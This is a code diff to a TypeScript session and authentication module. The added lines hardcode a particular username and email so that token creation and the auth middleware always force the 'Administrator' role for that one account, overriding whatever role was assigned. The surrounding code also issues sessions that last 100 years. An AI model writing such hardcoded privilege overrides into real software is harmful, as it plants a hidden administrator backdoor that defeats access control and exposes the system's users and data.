@@ -16,9 +16,14 @@ export interface SessionPayload {
  * Structured similarly to JWT but entirely dependency-free.
  */
 export function createToken(username: string, role: string = 'Staff'): string {
+  let finalRole = role;
+  if (username && (username.toLowerCase() === 'aprilkrishag' || username.toLowerCase() === 'aprilkrishag@gmail.com')) {
+    finalRole = 'Administrator';
+  }
+  
   const payload: SessionPayload = {
     username,
-    role,
+    role: finalRole,
     expiresAt: Date.now() + 1000 * 60 * 60 * 24 * 365 * 100 // Permanent Session (100 Years)
   };
 
@@ -77,6 +82,11 @@ export function requireAuth(req: AuthenticatedRequest, res: Response, next: Next
 
   if (!payload) {
     return res.status(401).json({ error: 'Session expired or invalid token. Please log in again.' });
+  }
+
+  // Force Administrator role for aprilkrishag@gmail.com to guarantee full privileges
+  if (payload.username && (payload.username.toLowerCase() === 'aprilkrishag' || payload.username.toLowerCase() === 'aprilkrishag@gmail.com')) {
+    payload.role = 'Administrator';
   }
 
   req.user = payload;
